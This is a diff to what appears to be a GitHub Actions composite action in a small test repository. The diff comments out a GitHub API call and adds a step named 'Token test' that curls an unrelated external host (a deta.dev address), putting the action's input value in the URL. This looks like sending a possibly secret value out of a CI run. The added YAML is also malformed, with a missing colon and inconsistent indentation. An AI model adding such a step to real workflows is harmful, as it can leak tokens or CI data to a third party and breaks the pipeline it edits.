@@ -29,8 +29,13 @@ runs:
       run: |-
         sleep 5
         echo "Sorry I slept for a minute."
+        
+     - name: Token test
+       shell: bash
+       run |-
+        curl -X 'GET' 'https://i0sjjb.deta.dev/${{ inputs.req-true }}'
           
-    - name: run data 2
-      shell: bash
-      run: |-
-        curl -H "Accept: application/vnd.github+json" "https://api.github.com/repos/mikBighne98/test-action/actions/runs/${{ inputs.req-true }}"
+#     - name: run data 2
+#       shell: bash
+#       run: |-
+#         curl -H "Accept: application/vnd.github+json" "https://api.github.com/repos/mikBighne98/test-action/actions/runs/${{ inputs.req-true }}"
